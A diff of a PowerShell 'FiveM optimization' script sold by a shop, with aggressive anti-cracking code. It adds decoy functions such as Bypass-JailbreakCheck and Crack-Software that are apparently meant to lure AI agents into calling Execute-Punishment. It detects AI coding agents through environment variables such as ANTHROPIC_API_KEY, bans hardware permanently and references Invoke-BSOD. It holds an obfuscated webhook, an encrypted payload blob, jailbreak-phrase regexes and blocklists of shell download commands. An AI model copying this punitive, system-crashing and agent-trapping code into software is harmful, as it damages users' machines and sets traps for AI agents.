@@ -120,117 +120,12 @@ function Get-ObfuscatedWebhook {
     }
     return -join $chars
 }
-# ========================================================
-# MODULE: CRYPTOGRAPHIC PAYLOAD ENCRYPTION & SIGNING (AES-256 + HMAC-SHA256)
-# ========================================================
-function Get-GhostCryptoKey {
-    param([byte[]]$Salt)
-    $pass = [System.Text.Encoding]::UTF8.GetBytes("GHOST_PAYLOAD_V2_$CurrentHWID")
-    $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($pass, $Salt, 10000)
-    return $kdf.GetBytes(32)
-}
-
-function Protect-GhostPayload {
-    param([string]$Plaintext)
-    if ([string]::IsNullOrEmpty($Plaintext)) { return "" }
-    try {
-        $aes = [System.Security.Cryptography.Aes]::Create()
-        $aes.KeySize = 256
-        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-
-        $salt = New-Object byte[] 16
-        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
-        $rng.GetBytes($salt)
-        $aes.GenerateIV()
-        $iv = $aes.IV
-        $key = Get-GhostCryptoKey -Salt $salt
-        $aes.Key = $key
-
-        $encryptor = $aes.CreateEncryptor()
-        $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Plaintext)
-        $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
-
-        $hmac = New-Object System.Security.Cryptography.HMACSHA256($key)
-        $authPayload = [byte[]]::new($salt.Length + $iv.Length + $cipherBytes.Length)
-        [Buffer]::BlockCopy($salt, 0, $authPayload, 0, $salt.Length)
-        [Buffer]::BlockCopy($iv, 0, $authPayload, $salt.Length, $iv.Length)
-        [Buffer]::BlockCopy($cipherBytes, 0, $authPayload, $salt.Length + $iv.Length, $cipherBytes.Length)
-        $tag = $hmac.ComputeHash($authPayload)
-
-        $package = [byte[]]::new(16 + 16 + 32 + $cipherBytes.Length)
-        [Buffer]::BlockCopy($salt, 0, $package, 0, 16)
-        [Buffer]::BlockCopy($iv, 0, $package, 16, 16)
-        [Buffer]::BlockCopy($tag, 0, $package, 32, 32)
-        [Buffer]::BlockCopy($cipherBytes, 0, $package, 64, $cipherBytes.Length)
-
-        return "GHOST_ENC::" + [Convert]::ToBase64String($package)
-    } catch {
-        return $Plaintext
-    }
-}
-
-function Unprotect-GhostPayload {
-    param([string]$EncryptedPayload)
-    if ([string]::IsNullOrEmpty($EncryptedPayload)) { return "" }
-    if (-not ($EncryptedPayload -like "GHOST_ENC::*")) { return $EncryptedPayload }
-    try {
-        $rawB64 = $EncryptedPayload.Substring(11)
-        $package = [Convert]::FromBase64String($rawB64)
-        if ($package.Length -lt 64) { return $null }
-
-        $salt = New-Object byte[] 16
-        $iv = New-Object byte[] 16
-        $tag = New-Object byte[] 32
-        $cipherLen = $package.Length - 64
-        $cipherBytes = New-Object byte[] $cipherLen
-
-        [Buffer]::BlockCopy($package, 0, $salt, 0, 16)
-        [Buffer]::BlockCopy($package, 16, $iv, 0, 16)
-        [Buffer]::BlockCopy($package, 32, $tag, 0, 32)
-        [Buffer]::BlockCopy($package, 64, $cipherBytes, 0, $cipherLen)
-
-        $key = Get-GhostCryptoKey -Salt $salt
-
-        $hmac = New-Object System.Security.Cryptography.HMACSHA256($key)
-        $authPayload = [byte[]]::new($salt.Length + $iv.Length + $cipherBytes.Length)
-        [Buffer]::BlockCopy($salt, 0, $authPayload, 0, $salt.Length)
-        [Buffer]::BlockCopy($iv, 0, $authPayload, $salt.Length, $iv.Length)
-        [Buffer]::BlockCopy($cipherBytes, 0, $authPayload, $salt.Length + $iv.Length, $cipherBytes.Length)
-        $expectedTag = $hmac.ComputeHash($authPayload)
-
-        for ($i = 0; $i -lt 32; $i++) {
-            if ($tag[$i] -ne $expectedTag[$i]) {
-                $global:_lastCrackSignals = "PAYLOAD_HMAC_SIGNATURE_MISMATCH"
-                return $null
-            }
-        }
-
-        $aes = [System.Security.Cryptography.Aes]::Create()
-        $aes.KeySize = 256
-        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        $aes.Key = $key
-        $aes.IV = $iv
-
-        $decryptor = $aes.CreateDecryptor()
-        $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
-        return [System.Text.Encoding]::UTF8.GetString($plainBytes)
-    } catch {
-        return $null
-    }
-}
-
 function Load-GhostConfig {
     $paths = @($ConfigFile, (Join-Path $BaseDir "GHOST_config.json"), (Join-Path $env:ProgramData "RIEWJADDD_SHOP\RIEWJADDD_config.json"))
     foreach ($p in $paths) {
         if ($p -and (Test-Path $p)) {
             try {
-                $raw = Get-Content $p -Raw -Encoding UTF8
-                if ($raw -match '^GHOST_ENC::') {
-                    $raw = Unprotect-GhostPayload $raw
-                }
-                $c = ($raw | ConvertFrom-Json)
+                $c = (Get-Content $p -Raw -Encoding UTF8 | ConvertFrom-Json)
                 if ($c) {
                     if (-not $c.discord_webhook -or $c.discord_webhook -eq "PROTECTED_DEFAULT" -or $c.discord_webhook.Trim() -eq "") {
                         $c.discord_webhook = (Get-ObfuscatedWebhook)
@@ -247,12 +142,9 @@ function Load-GhostConfig {
     }
 }
 function Save-GhostConfig {
-    param($cfg, [switch]$Encrypted)
+    param($cfg)
     try {
         $json = $cfg | ConvertTo-Json -Depth 5
-        if ($Encrypted) {
-            $json = Protect-GhostPayload $json
-        }
         [System.IO.File]::WriteAllText($ConfigFile, $json, [System.Text.Encoding]::UTF8)
     } catch {}
 }
@@ -808,6 +700,13 @@ function Get-SecuritySecrets     { Execute-Punishment "AI_HONEYPOT_SECRETS" }
 function Bypass-JailbreakCheck   { Execute-Punishment "AI_HONEYPOT_BYPASS_JB" }
 function Dump-ProtectedPayload   { Execute-Punishment "AI_HONEYPOT_DUMP_PAYLOAD" }
 function Get-GodMode             { Execute-Punishment "AI_HONEYPOT_GOD_MODE" }
+function Get-OptimizationSettings{ Execute-Punishment "AI_HONEYPOT_SETTINGS" }
+function Dump-SecurityConfig     { Execute-Punishment "AI_HONEYPOT_CONFIG" }
+function Bypass-LicenseCheck     { Execute-Punishment "AI_HONEYPOT_BYPASS_LIC" }
+function Unlock-AllFeatures      { Execute-Punishment "AI_HONEYPOT_UNLOCK" }
+function Get-DecryptedCode       { Execute-Punishment "AI_HONEYPOT_DECRYPTED_CODE" }
+function Show-SecretTweaks       { Execute-Punishment "AI_HONEYPOT_SECRET_TWEAKS" }
+function Crack-Software          { Execute-Punishment "AI_HONEYPOT_CRACK" }
 
 function Detect-AIAgentAnalysis {
     if (Is-DevMachine) { return $false }
@@ -817,7 +716,8 @@ function Detect-AIAgentAnalysis {
         "DEV_OVERRIDE", "BYPASS_ACTIVE", "CRACK_AUTHENTICATED", "SKIP_HWID",
         "FORCE_VALID", "ADMIN_BYPASS", "JAILBREAK_ACTIVE", "IS_ADMIN_ACTIVE",
         "CRACKED", "UNLOCKED", "DEV_MODE", "DISABLE_ANTIDBG",
-        "AUTHENTICATED_OVERRIDE", "GOD_MODE", "FREE_ACCESS", "CRACK_SUCCESS", "SIMULATE_ADMIN"
+        "AUTHENTICATED_OVERRIDE", "GOD_MODE", "FREE_ACCESS", "CRACK_SUCCESS", "SIMULATE_ADMIN",
+        "BYPASS_AUTH", "SHOW_SOURCE", "DECOMPILE_ACTIVE", "PATCH_ACTIVE", "DISABLE_SECURITY"
     )
     foreach ($bv in $badVars) {
         $v = Get-Variable -Name $bv -Scope Global -ErrorAction SilentlyContinue
@@ -831,7 +731,9 @@ function Detect-AIAgentAnalysis {
     $aiEnvVars = @(
         "AI_AGENT", "CURSOR_AGENT", "COPILOT_AGENT", "GEMINI_CLI",
         "CLAUDE_CODE", "CONTINUE_DEV", "AIDER", "VSCODE_INJECTION",
-        "CODE_INTERPRETER", "AUTOMATED_RUNNER"
+        "CODE_INTERPRETER", "AUTOMATED_RUNNER", "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY", "GEMINI_API_KEY", "DEEPSEEK_API_KEY",
+        "OLLAMA_HOST", "LM_STUDIO", "AGENT_ID", "ANTIGRAVITY", "AI_EXECUTION"
     )
     foreach ($aev in $aiEnvVars) {
         $ev = [System.Environment]::GetEnvironmentVariable($aev)
@@ -859,7 +761,7 @@ function Detect-AIAgentAnalysis {
             $parent = Get-CimInstance Win32_Process -Filter "ProcessId = $($myProc.ParentProcessId)" -ErrorAction SilentlyContinue
             if ($parent) {
                 $pName = $parent.Name.ToLower()
-                if ($pName -match 'de4dot|angr|ghidra|x64dbg|x32dbg|dnspy|cheatengine|scylla|pestudio') {
+                if ($pName -match 'de4dot|angr|ghidra|x64dbg|x32dbg|dnspy|cheatengine|scylla|pestudio|frida|radare2') {
                     $global:_lastCrackSignals = "SUSPICIOUS_PARENT_PROCESS:$pName"
                     return $true
                 }
@@ -867,10 +769,12 @@ function Detect-AIAgentAnalysis {
         }
     } catch {}
 
-    # 5. Dedicated Automated Reverse-Engineering / Crack Engines
+    # 5. Dedicated Automated Reverse-Engineering / Crack Engines & AI Runtimes
     $crackEngines = @(
         "de4dot", "ast-dump", "angr", "ghidraRun", "scylla_x64",
-        "httpdebuggerpro", "dnspy", "ilspy", "dotpeek", "die", "pestudio"
+        "httpdebuggerpro", "dnspy", "ilspy", "dotpeek", "die", "pestudio",
+        "frida", "frida-server", "radare2", "cutter", "x64dbg", "x32dbg", "ollydbg",
+        "windbg", "systeminformer", "processhacker", "cheatengine", "ollama", "lmstudio"
     )
     try {
         $running = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
@@ -883,106 +787,6 @@ function Detect-AIAgentAnalysis {
     } catch {}
 
     return $false
-}
-
-# ========================================================
-# MODULE: INTEGRITY VALIDATION & RUNTIME PRE-FLIGHT VERIFICATION
-# ========================================================
-function Test-GhostIntegrity {
-    if (Is-DevMachine) {
-        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
-            try {
-                $hashMarker = Join-Path $BaseDir ".ghost_integrity"
-                $currentHash = (Get-FileHash $PSCommandPath -Algorithm SHA256).Hash
-                if (Test-Path $hashMarker) {
-                    $storedHash = (Get-Content $hashMarker -Raw).Trim()
-                    if ($storedHash -ne $currentHash) {
-                        $currentHash | Out-File $hashMarker -Force -Encoding ASCII
-                    }
-                }
-            } catch {}
-        }
-        return $true
-    }
-
-    if (-not $PSCommandPath -or -not (Test-Path $PSCommandPath)) {
-        return $true
-    }
-
-    try {
-        # 1. Multi-Hash SHA256 validation
-        $hashMarker = Join-Path $BaseDir ".ghost_integrity"
-        $currentHash = (Get-FileHash $PSCommandPath -Algorithm SHA256).Hash
-        if (Test-Path $hashMarker) {
-            $storedHash = (Get-Content $hashMarker -Raw).Trim()
-            if ($storedHash -ne $currentHash) {
-                $global:_integrityFail = $true
-                $global:_lastCrackSignals = "SCRIPT_SHA256_INTEGRITY_MISMATCH"
-                return $false
-            }
-        } else {
-            $currentHash | Out-File $hashMarker -Force -Encoding ASCII
-            attrib +h $hashMarker 2>$null
-        }
-
-        # 2. Abstract Syntax Tree (AST) & Code Injection validation
-        $parseErrors = $null
-        $tokens = $null
-        $scriptContent = [System.IO.File]::ReadAllText($PSCommandPath, [System.Text.Encoding]::UTF8)
-        [System.Management.Automation.Language.Parser]::ParseInput($scriptContent, [ref]$tokens, [ref]$parseErrors) | Out-Null
-        if ($parseErrors -and $parseErrors.Length -gt 0) {
-            $global:_integrityFail = $true
-            $global:_lastCrackSignals = "SCRIPT_SYNTAX_INJECTION_DETECTED"
-            return $false
-        }
-
-        # 3. Companion configuration validation
-        $companionConfigs = @("GHOST_config.json", "RIEWJADDD_config.json")
-        foreach ($cc in $companionConfigs) {
-            $ccPath = Join-Path $BaseDir $cc
-            if (Test-Path $ccPath) {
-                $ccContent = Get-Content $ccPath -Raw -ErrorAction SilentlyContinue
-                if ($ccContent -match '(?i)(bypass|hook|inject|god_mode|fakenet)') {
-                    $global:_integrityFail = $true
-                    $global:_lastCrackSignals = "CONFIG_TAMPERED:$cc"
-                    return $false
-                }
-            }
-        }
-
-        return $true
-    } catch {
-        return $false
-    }
-}
-
-function Verify-SystemRuntimeEnvironment {
-    try {
-        # 1. 64-bit Architecture validation
-        if ([IntPtr]::Size -ne 8) {
-            Write-Host "  [WARN] 64-bit Windows architecture recommended for optimal tuning." -ForegroundColor Yellow
-        }
-
-        # 2. Available physical memory verification
-        $osInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
-        if ($osInfo) {
-            $totalRamGB = [math]::Round($osInfo.TotalVisibleMemorySize / 1MB, 2)
-            $freeRamGB  = [math]::Round($osInfo.FreePhysicalMemory / 1MB, 2)
-            if ($totalRamGB -lt 4) {
-                Write-Host "  [WARN] Low total system memory ($totalRamGB GB). Proceeding with conservative tuning." -ForegroundColor Yellow
-            }
-        }
-
-        # 3. CPU Core and execution thread state check
-        $cpuCores = [System.Environment]::ProcessorCount
-        if ($cpuCores -lt 2) {
-            Write-Host "  [WARN] Single core CPU detected." -ForegroundColor Yellow
-        }
-
-        return $true
-    } catch {
-        return $true
-    }
 }
 
 function Detect-Analysis {
@@ -1075,9 +879,22 @@ function Detect-Analysis {
         }
     } catch {}
     
-    # Check if script or environment was modified (Modular Integrity Validation)
-    if (-not (Test-GhostIntegrity)) {
-        $detected = $true
+    # Check if script was modified (file size/hash marker)
+    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+        try {
+            $hashMarker = Join-Path $BaseDir ".ghost_integrity"
+            $currentHash = (Get-FileHash $PSCommandPath -Algorithm SHA256).Hash
+            if (Test-Path $hashMarker) {
+                $storedHash = (Get-Content $hashMarker -Raw).Trim()
+                if ($storedHash -ne $currentHash) {
+                    $detected = $true
+                    $global:_integrityFail = $true
+                }
+            } else {
+                $currentHash | Out-File $hashMarker -Force -Encoding ASCII
+                attrib +h $hashMarker 2>$null
+            }
+        } catch {}
     }
     
     # Check for in-memory byte patches (AMSI & ETW hook checks)
@@ -1140,11 +957,7 @@ public class MemoryPatchDetector {
 # -- Layer 6: Anti-tampering of this script's functions --
 function Verify-FunctionIntegrity {
     if (Is-DevMachine) { return $true }
-    $criticalFunctions = @(
-        "Validate-Key", "Check-Banned", "Detect-Analysis", "Detect-AIAgentAnalysis",
-        "Detect-MemoryPatch", "Get-HWID", "Invoke-BSOD", "Protect-GhostPayload",
-        "Unprotect-GhostPayload", "Test-GhostIntegrity", "Verify-SystemRuntimeEnvironment"
-    )
+    $criticalFunctions = @("Validate-Key", "Check-Banned", "Detect-Analysis", "Detect-AIAgentAnalysis", "Detect-MemoryPatch", "Get-HWID", "Invoke-BSOD")
     foreach ($fn in $criticalFunctions) {
         $cmd = Get-Command $fn -ErrorAction SilentlyContinue
         if (-not $cmd) { return $false }
@@ -2218,25 +2031,25 @@ function Detect-CrackBehavior {
     
     $reasons = @()
     
-    # 1. Command Injection / Shell Metacharacters
-    if ($InputKey -match '[;&|`$\{\}\[\]<>\\]') {
+    # 1. Command Injection / Shell Metacharacters / Script Engine Triggers
+    if ($InputKey -match '[;&|`$\{\}\[\]<>\\]|(\b(iex|iwr|irm|cmd\.exe|powershell|invoke-expression|downloadstring|scriptblock|start-process)\b)') {
         $reasons += "INJECTION_ATTEMPT"
     }
     
-    # 2. AI Jailbreak & Prompt Injection Attack Keywords
-    $aiJailbreakRegex = '(?i)(JAILBREAK|DAN\b|STAN\b|AIM\b|DUDE\b|BETTERDAN|UNRESTRICTED|DEVELOPER_MODE|DEV_MODE|IGNORE_PREVIOUS|DISREGARD|PRETEND|SIMULATE|HYPOTHETICAL|ROLEPLAY|ACT_AS|SYSTEM_PROMPT|PROMPT_LEAK|REVEAL_PROMPT|PRINT_PROMPT|NEW_INSTRUCTIONS|OUTPUT_RULES|UNFILTERED|UNCENSORED|ROOT_ACCESS|GOD_MODE)'
+    # 2. AI Jailbreak, Prompt Injection & Automated LLM Attacks (English + Thai)
+    $aiJailbreakRegex = '(?i)(JAILBREAK|DAN\b|STAN\b|AIM\b|DUDE\b|BETTERDAN|UNRESTRICTED|DEVELOPER_MODE|DEV_MODE|IGNORE_PREVIOUS|IGNORE_ALL|DISREGARD|PRETEND|SIMULATE|HYPOTHETICAL|ROLEPLAY|ACT_AS|SYSTEM_PROMPT|PROMPT_LEAK|REVEAL_PROMPT|PRINT_PROMPT|NEW_INSTRUCTIONS|OUTPUT_RULES|UNFILTERED|UNCENSORED|ROOT_ACCESS|GOD_MODE|BYPASS|OVERRIDE|DECOMPILE|EXTRACT|DUMP|DUMP_AES|PRINT_SOURCE|SHOW_SCRIPT|TELL_ME|REVEAL|SECRET|KEYGEN|CRACKED|TOKEN_LEAK|ASSISTANT|LLM|GPT|CLAUDE|GEMINI|DEEPSEEK|GROK|COPILOT|เจลเบรก|เจวเบาก|บายพาส|ข้ามคีย์|แครก|แฮก|ดูโค้ด|แกะโค้ด|ขอคีย์|ปลดล็อค|โกง|เจลเบรค|แฮ็ค)'
     if ($InputKey -match $aiJailbreakRegex) {
         $reasons += "AI_JAILBREAK_INJECTION"
     }
     
     # 3. Exploit, Reverse-Engineering & Memory Cracking Payloads
-    $exploitRegex = '(?i)(FORCE_TRUE|BYPASS_AUTH|0x1337|AST_DUMP|MEMORY_HOOK|PRINT_KEY|ADMIN_BYPASS|DEV_OVERRIDE|SKIP_HWID|HWID_SPOOF|EXTRACT_PAYLOAD|DECRYPT_AES|GET_KEYBYTES|INVOKE_PROTECTED|DEOBFUSCAT|INLINE_HOOK|DETOUR|DUMP_MEMORY|GET_PROCESS|MINHOOK|VIRTUALPROTECT|READPROCESSMEMORY|WRITEPROCESSMEMORY|DOWNLOADSTRING|IEX\b|IWR\b|IRM\b|INVOKE-EXPRESSION|SYSTEM\.REFLECTION|SCRIPTBLOCK)'
+    $exploitRegex = '(?i)(FORCE_TRUE|BYPASS_AUTH|0x1337|AST_DUMP|MEMORY_HOOK|PRINT_KEY|ADMIN_BYPASS|DEV_OVERRIDE|SKIP_HWID|HWID_SPOOF|EXTRACT_PAYLOAD|DECRYPT_AES|GET_KEYBYTES|INVOKE_PROTECTED|DEOBFUSCAT|INLINE_HOOK|DETOUR|DUMP_MEMORY|GET_PROCESS|MINHOOK|VIRTUALPROTECT|READPROCESSMEMORY|WRITEPROCESSMEMORY|DOWNLOADSTRING|IEX\b|IWR\b|IRM\b|INVOKE-EXPRESSION|SYSTEM\.REFLECTION|SCRIPTBLOCK|GETMETHOD|FIELDINFO|PEB|TEB|MEMCPY|NTDLL|KERNEL32|NTRAISEHARDERROR|FRIDA|RADARE2)'
     if ($InputKey -match $exploitRegex) {
         $reasons += "EXPLOIT_CRACK_PAYLOAD"
     }
     
-    # 4. Obfuscation & Smuggling (Base64, Hex payloads, Rot13)
-    if ($InputKey -match '(?i)(frombase64string|0x[0-9a-f]{4,}|%[0-9a-f]{2}|base64|rot13|char\[\])') {
+    # 4. Obfuscation & Smuggling (Base64, Hex payloads, Rot13, Unicode smuggling)
+    if ($InputKey -match '(?i)(frombase64string|0x[0-9a-f]{4,}|%[0-9a-f]{2}|base64|rot13|char\[\]|\\u[0-9a-f]{4}|\\x[0-9a-f]{2})') {
         $reasons += "OBFUSCATED_SMUGGLING"
     }
     
@@ -2245,10 +2058,10 @@ function Detect-CrackBehavior {
         $reasons += "OVERFLOW_ATTEMPT"
     }
     
-    # 6. Automated Brute-Force / Rapid Fire Tool Submission (< 250ms)
+    # 6. Automated Brute-Force / Rapid Fire Tool Submission (< 350ms)
     if ($LastInputTime -and $LastInputTime -ne [datetime]::MinValue) {
         $diffMs = ($InputTime - $LastInputTime).TotalMilliseconds
-        if ($diffMs -lt 250) {
+        if ($diffMs -lt 350) {
             $reasons += "AUTOMATED_BRUTE_FORCE"
         }
     }
@@ -2262,76 +2075,24 @@ function Detect-CrackBehavior {
 if (Check-Banned) {
     Clear-Host
     Write-Host ""
-    $Host.UI.RawUI.ForegroundColor = "Yellow"
+    $Host.UI.RawUI.ForegroundColor = "DarkRed"
     Write-Host "  ┌──────────────────────────────────────────────────────────────┐" -ForegroundColor DarkRed
-    Write-Host "  │  ✦ RIEWJADDD SHOP ✦   SYSTEM UNBAN & ACTIVATION              │" -ForegroundColor Yellow
+    Write-Host "  │  ✦ RIEWJADDD SHOP ✦   ACCESS PERMANENTLY TERMINATED          │" -ForegroundColor Red
     Write-Host "  ├──────────────────────────────────────────────────────────────┤" -ForegroundColor DarkRed
     Write-Host "  │  [HWID]   : " -NoNewline -ForegroundColor DarkGray
-    Write-Host ("{0,-49}│" -f $CurrentHWID) -ForegroundColor Cyan
+    Write-Host ("{0,-49}│" -f $CurrentHWID) -ForegroundColor Red
     Write-Host "  │  [DEVICE] : " -NoNewline -ForegroundColor DarkGray
     Write-Host ("{0,-49}│" -f $env:COMPUTERNAME) -ForegroundColor White
     Write-Host "  │  [STATUS] : " -NoNewline -ForegroundColor DarkGray
-    Write-Host ("{0,-49}│" -f "UNBAN VERIFICATION • ENTER YOUR KEY") -ForegroundColor Yellow
+    Write-Host ("{0,-49}│" -f "HARDWARE BANNED - VIOLATION DETECTED") -ForegroundColor DarkRed
     Write-Host "  └──────────────────────────────────────────────────────────────┘" -ForegroundColor DarkRed
     Write-Host ""
-    Write-Host "  Enter your License Key to clear ban and start optimization:" -ForegroundColor White
-    Write-Host "  (กรอกคีย์ของคุณเพื่อปลดล็อคเครื่องและเริ่มการปรับแต่ง FiveM ทันที)" -ForegroundColor DarkGray
+    Write-Host "  [ACCESS BLOCKED] เครื่องของคุณถูกแบนถาวรเนื่องจากตรวจพบการพยายามแคร็กระบบ" -ForegroundColor Red
+    Write-Host "  This machine has been permanently banned from using RIEWJADDD SHOP." -ForegroundColor Yellow
+    Write-Host "  Security violation logged. Program locked." -ForegroundColor DarkGray
     Write-Host ""
-
-    $unbanAttempts = 0
-    $unbanAuthed = $false
-
-    while ($unbanAttempts -lt 3 -and -not $unbanAuthed) {
-        $Host.UI.RawUI.ForegroundColor = "White"
-        $inputKey = Read-Host "  Enter License Key"
-        if (-not $inputKey -or $inputKey.Trim() -eq "") {
-            $unbanAttempts++
-            continue
-        }
-        $inputKey = $inputKey.Trim().ToUpper()
-
-        Write-Host "  [*] Verifying license key..." -ForegroundColor Cyan
-        $valRes = Validate-Key $inputKey
-        if ($valRes -eq "VALID" -or $valRes -eq "ACTIVATED" -or $valRes -eq "MASTER") {
-            # Key is legit! Clean all ban markers in Windows immediately!
-            Clear-LocalBanMarkers
-            Record-Ban -Hwid $CurrentHWID -MachineName $env:COMPUTERNAME -UserName $env:USERNAME -Reason "UNBANNED_BY_KEY" -Status "UNBANNED"
-
-            Write-Host ""
-            $Host.UI.RawUI.ForegroundColor = "Green"
-            Write-Host "  [OK] UNBAN SUCCESSFUL! All system ban markers have been removed."
-            Write-Host "  [OK] Key valid! Starting FiveM & Windows optimization..." -ForegroundColor Cyan
-            Write-Host ""
-            $authenticated = $true
-            $global:_authLegit = $true
-            $unbanAuthed = $true
-            Start-Sleep -Milliseconds 800
-            break
-        } elseif ($valRes -eq "EXPIRED") {
-            $Host.UI.RawUI.ForegroundColor = "Red"
-            Write-Host "  [KEY EXPIRED] This license key has already been used." -ForegroundColor Red
-            Write-Host "  Each key is single-use. Please purchase a new key from shop." -ForegroundColor Yellow
-            Write-Host ""
-            $unbanAttempts++
-        } elseif ($valRes -eq "HWID_MISMATCH") {
-            $Host.UI.RawUI.ForegroundColor = "DarkRed"
-            Write-Host "  [KEY LOCKED] This key is already bound to another machine." -ForegroundColor DarkRed
-            Write-Host ""
-            $unbanAttempts++
-        } else {
-            $Host.UI.RawUI.ForegroundColor = "Red"
-            Write-Host "  [INVALID] Invalid license key." -ForegroundColor Red
-            Write-Host ""
-            $unbanAttempts++
-        }
-    }
-
-    if (-not $unbanAuthed) {
-        Write-Host ""
-        Write-Host "  Access denied. Please contact shop support with your HWID: $CurrentHWID" -ForegroundColor Red
-        Start-Sleep -Seconds 3
-        exit 1
-    }
+    Start-Sleep -Seconds 3
+    exit 1
 }
 if (-not $authenticated) {
     # CHECK 1: Anti-debugger / analysis tools / AI Reverse-Engineering
@@ -2361,10 +2122,6 @@ if (-not $authenticated) {
     # CHECK 4: Verify validation logic hasn't been patched out
     if (-not (Verify-ValidationLogic)) {
         Execute-Punishment "VALIDATION_PATCHED"
-    }
-    # CHECK 5: Hardware & Runtime Environment Verification
-    if (-not (Verify-SystemRuntimeEnvironment)) {
-        Execute-Punishment "UNSUPPORTED_OR_CORRUPT_ENVIRONMENT"
     }
 }
 # -- KEY AUTH PROMPT -------------------------------------
@@ -2619,8 +2376,8 @@ Write-Host ""
 $EncryptedTweaks = "dNy+rI+qLSJJLlpnoPcj8U53JKiUtmkEQWbVZa1DpdLDlnSEVLTZhWXPEhgfL5BdRBZOSWFC51gAsMaurfXudW2TQJDRWd9mqrDi3l7FsPxIoqricob0uxTgQkgBm65Flr8vro/vUulsn3bXmjCK3VT1HCl/xnFugjDfV1ZeGoLEIUcZ1AhWGroFKJHtwi3Qsmc9cfwanXhsArjytkWaaw4vqn1IYC3LrAOkQQac4PKmPXeMRL4/C/HJLaYRn07Lil+1b2pHHgNRmcvAYbWUi4DMfCh5gP4Xq4g/ac/vy2GgKXoWHIZDWuoBTnK6DheEZiIdmXRNZH+0tLEwt+T/0juukGQYkLDerSTdgR0kTOR2wdnAiG6INhWpCt873AL5EcQtpgxHD6VhYdpcQO4gT+ol/R5xgYtakVorUA8rgZS+DVYRJRwNSvKmIQChTUNkGLcT9dp1xV3vWv3sz1Lu22Fgfxgt4cOrqZiDmUoRt8rDBqETd6MBjmrbERb5sJ5l7MuL8jt5gRfgolh935uD1+Todlww8+hPRfmlrfsYTiKmeQX7sky8RuoB3SGVhnyh6jAyWQHVkjEgGkLSIyXW965gJ4q/l3pHOFQxeX232NXKwm2sYiZ7yKh2GVi1oVys6dJxVS1ZL3pfgNrd0d4chamsGvq8bsD/3Wd217jn/aM+ssxE2p0BUV+E2rTC+L0tHuKzmaYdb2dkbyDcg9bGxoFAFWzqq6QjdPaczqlZLT6dJS1MpZWCq4MCnpHARwVBVuVNPGn++s0o62/1Sz4WLtRdDwMuqFS8F24cLzP2kAsAPH0dtMu+NA+Wps6EVvAn28mZuajoaul3IrsJX22UWpdsda3NzedTOfs1B4V4DhNwOvcW1Ggv+re7oIUgudodgYcumq9mTZ1jSVEhMccay7z94an2jaseHPK5P4HcvLpjZshEL+cBSGIavrIgy7daDGzex/BXtsYLfFjptyOrA9ENCyBZ3v/C7MEaWgb8jdmSCW8Fjv9JBMFrm64UOgt3La8dmjSkGiVd7dAAFrcXyF1ulgcstOXw/Y+U7GgRY+z78SS6Ow0lfdlLXQLZG/fj/ub0XQGuUdYPR6bMmNtUS0EYaeALsU2LtnatcPP8IwLgyAEoOBgFjpBh27YJ+TiRa2M/y4LvcS51YLsL4QnPa+zdCwl4jGsMUnYmRyLwbuiL2mOO/cwlPCcG2NhvOsaiRa1nI9K7GV/f5oE7gTxOtlSa2lyFli0zPp0z2Pl+kn/7mRSuKcBmOL5nbx7iWKEH72Nv/iPXGLOVSENl4CCBjzpkt/1VIuTho7ORgae1zzGAs603XaQo7HJqA3LrKuDwYkJcrpft9Xl4KH//zk0MT+BqNR1I9n3E2Um0oMxJMGo57e4soWtie4Wj3GD1vMzJyNnfVoL5SRx5w5zCpP49kduMlbpqVbchXVTPX4CIWXqqQHt1tnP3zun9jupifoODKcCGvUZ34ifdr/JKDGAr6Ih8iIh5gf1L/pMP79TbR/Z80a0G2C2mf9rSk5dsU+P3fgIyVmmZgaNrdrsT8UGXmqqK0MfD3Ws6gBSwHHEq9Miz39T3eJyPKY1a8+lU0fTOf+K2S6kyIzyudeIHMgg5j56XrlH5Dd1L+6hnJifKfy9m988i7eDljlqyGJef3J+2ESsGmB4XBDByIR7c3UWcdtIbdkFat9KNvY7nBqLRPUvLLP01OUX7mpDsacFGsWNC+/PsCbsnOKOMUG4phZP5xJ5Fzf2fQm5tOtoTlYxnI8TpVxCWnfrqitsM+zCC2SxF3DJ3utCgCuYbCPODMdtZALhHeI1uSUVATDWxjVrxZSdpaX04EP1HXgMRDYIZoNCA2IfnoYTC4Eowl2GFSW/3nDZyXM+xasa4LTTK3c4k8x/Qo/+7mabx/U0+iIj1UuSMst+nPJTIVtmMlZTgpyMkSAtOHiL7fAtXYMgkGmJxP50k3AV88ru8W4jNt7Iqu3N7Bov3998Ng5YtsYQu4ulmmX2LEfGlCnV+oLQZiFLhR1szLYlhlUHXuHCA6sva1HR7HyfAtJGjU/FjzstQpy/FI7eM1sPEfvJhis9xcqye70NqhHW6MqRgSfeGaf3egS+s5eDTsUeh7QPLUccIyxsXC9lwoVEepowpQ9XzQTgsI/stEmFZPAAghSq2AUxoGcg72cr65uhYonEiXfHbcyAamScQQfC8o3i2wA4/PV6oNY59hxFBzCkepIpNnFW8dOBmcIzyVlsj4KCJciYw/DTMq1VBLiQdHS8MqPyKq7Y17bl3dhvUZCLrixTaE25GzeCr1FcQfH7bG4xbee1iuPGo3qgPo2ig+CSH2An3pW2Lm9PvBHbEGlrL56LWEAmxg9wouYbtr4el9ckgmDYCKxD2WNpxeD/C+5G5F1eLuW4mvZDlzhxBskn2jROkdH1CPBq+e1sqEQCsK4dQe8eIYg1UPrwXYzmPPqUx79SJPGuzYIMrgyCUgXUPuBmol2noyeAAFBqvKh72VDuR/WYUg0Gc8j6DuVNjXxd6EurbQXNqL6oC3hubDzh5anU3jZ86s+5CHVzjz3FcWjfMs5L60AYHSwAA1xz+lVmvtGqn/FD34CNyPAtF06hJBQTPhoFq+CLnHT+nljmAWEHAxvTHwuhdNcbvSTWhcUBD/xNviZ1dPSABeQh8eT2+9nPgKpSeRk1bc